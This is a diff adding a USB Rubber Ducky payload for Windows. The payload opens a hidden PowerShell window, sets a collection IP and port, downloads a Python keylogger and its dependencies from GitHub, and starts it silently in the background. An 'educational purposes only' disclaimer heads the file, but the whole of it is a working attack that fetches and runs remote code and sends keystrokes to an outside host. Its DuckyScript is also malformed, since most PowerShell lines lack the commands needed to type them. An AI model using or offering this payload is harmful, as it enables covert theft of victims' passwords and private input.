@@ -1,0 +1,41 @@
+REM Rubber Ducky Payload for Python Keylogger (Windows)
+REM Educational purposes only - Use only on systems you own or have permission to test
+REM This payload downloads the keylogger, sets config via env vars, installs deps, and runs it
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+
+REM Set configuration - CHANGE THESE VALUES
+$env:KEYLOGGER_IP="192.168.1.100"
+$env:KEYLOGGER_PORT="8080"
+$env:KEYLOGGER_INTERVAL="10"
+$env:KEYLOGGER_USE_TLS="false"
+$env:KEYLOGGER_LOG_LEVEL="WARNING"
+$env:KEYLOGGER_LOG_FILE="$env:TEMP\keylogger.log"
+
+REM Download keylogger script directly (no git needed)
+cd $env:TEMP
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/keylogger_configurable.py" -OutFile "keylogger_configurable.py"
+DELAY 3000
+
+REM Download requirements
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/davidbombal/python-keylogger/main/requirements.txt" -OutFile "requirements.txt"
+DELAY 2000
+
+REM Install dependencies
+pip install -r requirements.txt --quiet
+DELAY 15000
+
+REM Run keylogger in background
+Start-Process python -ArgumentList "keylogger_configurable.py" -WindowStyle Hidden
+DELAY 1000
+
+REM Clean up downloaded files (optional)
+REM Remove-Item keylogger_configurable.py, requirements.txt
+
+EXIT
+ENTER
